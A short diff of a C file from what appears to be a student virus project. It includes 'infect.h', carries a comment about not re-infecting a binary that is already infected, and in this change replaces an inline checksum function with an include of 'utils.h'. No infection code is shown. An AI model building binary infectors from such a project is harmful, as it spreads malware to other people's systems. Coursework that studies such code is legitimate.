@@ -6,21 +6,13 @@
 /*   By: ichkamo <ichkamo@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/15 15:48:52 by ichkamo           #+#    #+#             */
-/*   Updated: 2019/12/19 01:18:40 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/20 22:05:54 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "infect.h"
 #include "errors.h"
-
-static uint64_t	checksum(const char *buff, size_t buffsize)
-{
-	uint64_t	sum = 0;
-
-	while (buffsize--)
-		sum += buff[buffsize];
-	return sum;
-}
+#include "utils.h"
 
 /*
 ** if current binary is already our client, don't infect again ! <3
